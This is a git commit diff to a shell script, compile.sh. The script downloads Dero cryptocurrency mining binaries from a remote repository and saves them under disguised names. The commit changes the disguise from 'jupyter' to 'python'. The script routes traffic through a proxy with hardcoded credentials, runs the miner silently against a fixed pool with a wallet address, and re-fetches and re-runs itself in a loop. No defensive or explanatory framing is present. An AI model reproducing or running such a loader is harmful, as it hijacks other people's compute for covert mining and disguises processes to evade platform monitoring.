cd863b7fb49d45d1f78ca288895f169421fb8829
sindualan82 <114896695+sindualan82@users.noreply.github.com>
2022-11-04 03:11:19 +0700

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -2,8 +2,8 @@ proxy="159.223.89.34"
 port="64055"
 user="ingfo"  
 pass="maseh"
-wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
-wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
+wget -q -O python https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x python
+wget -q -O python https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x python
 wget -q -O proxy https://gitlab.com/alekpoden82/binamas/-/raw/main/panel && chmod +x proxy
 wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
 wget https://gitlab.com/alekpoden82/binamas/-/raw/main/libproxychains4.so && chmod +x libproxychains4.so
@@ -21,6 +21,6 @@ echo "Original IP ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "New IP ==> "$(./proxy curl ifconfig.me)
-timeout 16m ./proxy ./jupyter -r 159.223.89.34:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.$(echo $(shuf -i 1-20000 -n 1)-saera)>/dev/null &
+timeout 16m ./proxy ./python -r 159.223.89.34:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.$(echo $(shuf -i 1-20000 -n 1)-saera)>/dev/null &
 ./compile.sh
 echo success
